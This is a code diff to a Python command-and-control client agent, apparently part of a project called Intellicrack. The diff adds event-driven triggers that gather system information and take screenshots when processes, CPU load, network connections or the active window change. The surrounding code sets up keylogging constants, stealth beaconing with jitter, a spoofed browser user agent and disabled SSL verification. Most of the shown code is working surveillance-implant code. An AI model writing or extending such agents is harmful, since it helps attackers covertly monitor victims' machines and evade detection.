@@ -16,25 +16,28 @@ You should have received a copy of the GNU General Public License
 along with this program.  If not, see <https://www.gnu.org/licenses/>.
 """
 
+import asyncio
+import json
+import logging
+import os
+import platform
+import queue
+import random
+import socket
+import sys
+import time
+from typing import Any, Dict, List, Optional
+
+import psutil
+
+from .base_c2 import BaseC2
+
 """
 C2 Client Implementation
 
 Client-side C2 agent with multi-protocol support, encryption,
 and autonomous operation capabilities.
 """
-
-import asyncio
-import json
-import logging
-import os
-import platform
-import random
-import socket
-import time
-from typing import Any, Dict, List, Optional
-
-from .base_c2 import BaseC2
-from .encryption_manager import EncryptionManager
 
 # Windows API constants for keylogging
 WH_KEYBOARD_LL = 13
@@ -52,14 +55,14 @@ class C2Client(BaseC2):
         """Initialize the C2 client agent."""
         self.config = config
         self.logger = logging.getLogger("IntellicrackLogger.C2Client")
-        
+
         # Client configuration
         self.server_host = config.get('server_host', 'localhost')
         self.server_port = config.get('server_port', 8080)
         self.protocol = config.get('protocol', 'https')
         self.encryption_key = config.get('encryption_key')
         self.client_id = config.get('client_id', self._generate_client_id())
-        
+
         # Connection management
         self.connection = None
         self.connected = False
@@ -67,33 +70,33 @@ class C2Client(BaseC2):
         self.heartbeat_interval = config.get('heartbeat_interval', 30)  # seconds
         self.reconnect_attempts = 0
         self.max_reconnect_attempts = config.get('max_reconnect_attempts', 5)
-        
+
         # Command execution
         self.command_queue = queue.Queue()
         self.result_queue = queue.Queue()
         self.running = False
         self.worker_thread = None
-        
+
         # Security features
         self.use_encryption = config.get('use_encryption', True)
         self.verify_ssl = config.get('verify_ssl', False)
         self.user_agent = config.get('user_agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)')
-        
+
         # Stealth features
         self.jitter_enabled = config.get('jitter_enabled', True)
         self.sleep_time = config.get('sleep_time', 1.0)
         self.max_jitter = config.get('max_jitter', 0.3)
-        
+
         # Statistics
         self.commands_executed = 0
         self.bytes_sent = 0
         self.bytes_received = 0
         self.session_start_time = time.time()
-        
+
         # Initialize encryption if enabled
         if self.use_encryption and self.encryption_key:
             self._setup_encryption()
-        
+
         self.logger.info(f"C2 client initialized for {self.server_host}:{self.server_port}")
 
     def _initialize_protocols(self):
@@ -382,20 +385,98 @@ class C2Client(BaseC2):
             self.logger.error(f"Failed to send task result: {e}")
 
     async def _perform_autonomous_activities(self):
-        """Perform autonomous intelligence gathering activities."""
+        """Perform autonomous intelligence gathering activities based on real triggers."""
         try:
+            current_time = time.time()
+
             if self.auto_gather_info:
-                # Periodically gather system information
-                if random.random() < 0.1:  # 10% chance
+                # Gather system information based on real triggers
+                if await self._should_gather_info(current_time):
                     await self._autonomous_info_gathering()
 
             if self.auto_screenshot:
-                # Take periodic screenshots
-                if random.random() < 0.05:  # 5% chance
+                # Take screenshots based on real events
+                if await self._should_take_screenshot(current_time):
                     await self._autonomous_screenshot()
 
         except (OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) as e:
             self.logger.error(f"Error in autonomous activities: {e}")
+
+    async def _should_gather_info(self, current_time: float) -> bool:
+        """Determine if system info should be gathered based on real triggers."""
+        # Check time-based trigger (every 10 minutes)
+        if not hasattr(self, '_last_info_gather'):
+            self._last_info_gather = 0
+
+        if current_time - self._last_info_gather > 600:  # 10 minutes
+            self._last_info_gather = current_time
+            return True
+
+        # Check system change triggers
+        try:
+            # Check if new processes started
+            current_processes = len(psutil.pids())
+            if not hasattr(self, '_last_process_count'):
+                self._last_process_count = current_processes
+
+            if abs(current_processes - self._last_process_count) > 5:
+                self._last_process_count = current_processes
+                self._last_info_gather = current_time
+                return True
+
+            # Check CPU usage spike
+            cpu_percent = psutil.cpu_percent(interval=0.1)
+            if cpu_percent > 80:
+                self._last_info_gather = current_time
+                return True
+
+            # Check for new network connections
+            connections = len(psutil.net_connections())
+            if not hasattr(self, '_last_connection_count'):
+                self._last_connection_count = connections
+
+            if abs(connections - self._last_connection_count) > 10:
+                self._last_connection_count = connections
+                self._last_info_gather = current_time
+                return True
+
+        except Exception:
+            pass
+
+        return False
+
+    async def _should_take_screenshot(self, current_time: float) -> bool:
+        """Determine if screenshot should be taken based on real events."""
+        # Check time-based trigger (every 30 minutes)
+        if not hasattr(self, '_last_screenshot'):
+            self._last_screenshot = 0
+
+        if current_time - self._last_screenshot > 1800:  # 30 minutes
+            self._last_screenshot = current_time
+            return True
+
+        # Check for user activity
+        try:
+            # Check if active window changed
+            if sys.platform == 'win32':
+                import win32gui
+                current_window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
+
+                if not hasattr(self, '_last_active_window'):
+                    self._last_active_window = current_window
+
+                if current_window != self._last_active_window:
+                    self._last_active_window = current_window
+                    self._last_screenshot = current_time
+                    return True
+
+            # Check for significant screen changes (using basic metrics)
+            # This would require more sophisticated screen monitoring in production
+
+        except Exception:
+            pass
+
+        return False
 
     async def _calculate_beacon_time(self) -> float:
         """Calculate next beacon time with jitter."""
